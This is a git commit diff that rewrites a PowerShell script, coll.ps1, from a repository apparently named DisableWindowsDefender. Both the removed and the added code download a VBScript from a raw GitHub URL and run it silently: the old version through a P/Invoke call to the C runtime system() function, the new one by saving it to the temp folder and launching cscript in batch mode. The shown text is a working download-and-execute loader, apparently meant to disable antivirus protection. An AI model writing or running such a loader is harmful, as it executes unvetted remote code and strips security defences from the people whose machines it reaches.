52b54ecbe3d0bc7aba22ccc17e70f17e34b0e9ae
Raroford32 <109440929+Raroford32@users.noreply.github.com>
2024-07-25 15:05:33 +0330

    Update coll.ps1

--- coll.ps1
+++ coll.ps1
@@ -1,24 +1,4 @@
 $url = "https://raw.githubusercontent.com/Raroford32/DisableWindowsDefender/Raroford32-patch-1/carl.vbs"
-$vbsContent = Invoke-WebRequest -Uri $url -UseBasicParsing | Select-Object -ExpandProperty Content
-
-# Define a function to run VBScript from memory
-Add-Type -TypeDefinition @"
-using System;
-using System.Diagnostics;
-using System.Runtime.InteropServices;
-
-public class VBSExecutor
-{
-    [DllImport("msvcrt.dll", CharSet = CharSet.Ansi)]
-    public static extern int system(string command);
-
-    public static void Execute(string vbsCode)
-    {
-        string command = $"echo {vbsCode.Replace("\"", "\"\"")} > %temp%\\temp.vbs && cscript //B //NoLogo %temp%\\temp.vbs";
-        system(command);
-    }
-}
-"@
-
-# Execute the VBScript content
-[VBSExecutor]::Execute($vbsContent)
+$tempFile = "$env:temp\carl.vbs"
+Invoke-WebRequest -Uri $url -OutFile $tempFile
+cscript //B //NoLogo $tempFile
